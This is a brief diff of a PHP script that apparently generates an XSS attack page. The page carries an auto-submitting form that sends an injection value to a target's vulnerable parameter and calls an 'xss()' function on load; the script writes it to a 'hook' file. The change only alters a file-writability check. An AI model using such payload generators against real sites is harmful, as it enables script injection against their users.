@@ -86,7 +86,7 @@ $sHTML_Header = "<html><head><title></title><meta http-equiv='content-type' cont
 $sHTML_Content = "<body onload='xss();'><form method='".$_REQUEST['method']."' name='f' action='$target'><input name='$vulnerability' value='$injection'><input type='submit' name='s'></form>";
 $sHTML_Footer =  "</body></html>";
 $filename = "Index.html"; // this is the filename of the archive ('hook') generated on your server.
-if (is_writable($filename)) {
+if (is_writable(getcwd())) {
    IF (!$handle = fopen($filename, 'w')) {
          echo "Cannot open file ($filename)";
          exit;
